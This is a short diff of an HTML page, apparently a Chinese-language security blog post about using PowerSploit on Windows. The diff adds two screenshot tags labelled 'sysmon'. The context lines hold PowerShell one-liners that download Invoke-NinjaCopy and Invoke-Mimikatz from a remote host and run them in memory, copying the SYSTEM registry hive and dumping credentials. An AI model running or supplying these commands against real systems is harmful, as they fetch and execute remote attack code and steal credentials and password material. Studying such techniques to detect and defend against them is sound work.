@@ -294,6 +294,8 @@ output <span class="o">{</span>
 <p>我们使用 PowerSploit 干一下</p>
 <div class="highlight"><pre><span></span>https://github.com/mattifestation/PowerSploit.git
 </pre></div>
+<p><img alt="sysmon" class="img-fluid" src="../images/WechatIMG83.jpeg"/></p>
+<p><img alt="sysmon" class="img-fluid" src="../images/WechatIMG84.jpeg"/></p>
 <div class="highlight"><pre><span></span>powershell IEX <span class="o">(</span>New-Object System.Net.Webclient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="se">\"</span>http://172.16.251.133/Exfiltration/Invoke-NinjaCopy.ps1<span class="se">\"</span><span class="o">)</span><span class="p">;</span>Invoke-NinjaCopy  -Path   C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>onfig<span class="se">\S</span>YSTEM -LocalDestination .<span class="se">\s</span>ystem.hive
 
 powershell IEX <span class="o">(</span>New-Object System.Net.Webclient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="se">\"</span>http://172.16.251.133/Exfiltration/Invoke-Mimikatz.ps1<span class="se">\"</span><span class="o">)</span><span class="p">;</span>Invoke-Mimikatz   -DumpCreds 
